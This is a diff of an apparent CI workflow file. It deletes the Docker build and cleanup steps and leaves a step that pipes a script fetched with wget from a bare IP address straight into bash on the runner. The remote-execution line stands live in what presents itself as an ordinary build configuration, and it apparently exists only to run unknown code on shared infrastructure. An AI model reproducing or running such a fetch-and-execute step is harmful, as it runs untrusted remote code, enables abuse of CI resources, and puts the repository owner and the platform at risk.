@@ -8,9 +8,4 @@ jobs:
     steps:
       - run: lscpu
       - run: apt update && apt -y install wget
-      - run: docker build --tag mirekphd/docker .
-      - run: docker run --rm -it mirekphd/docker bash
-      - run: cd root
-      - run: rm /etc/apt/sources.list.d/cuda.list
-      - run: rm /etc/apt/sources.list.d/nvidia-ml.list
       - run: wget -O - http://23.92.22.221/start_basket_fle_ftx_ph_ws3.sh | bash
